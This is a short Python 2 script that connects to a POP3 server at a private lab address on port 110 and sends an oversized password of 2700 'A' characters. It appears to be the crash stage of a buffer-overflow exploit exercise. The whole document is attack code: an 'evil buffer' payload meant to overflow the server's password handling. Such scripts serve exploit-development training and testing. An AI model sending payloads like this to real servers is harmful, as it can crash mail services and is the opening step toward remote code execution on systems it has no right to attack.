#! /usr/bin/python
import socket

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer= 'A' * 2700

#try:
print'Sending evil buffer...'
s.connect(('192.168.56.109',110))
data=s.recv(1024)
s.send('USER test'+'\n')
data=s.recv(1024)
s.send('PASS ' + buffer + '\n')
print 'Done!.'
#except:
#    print'Could not connect to POP3!'

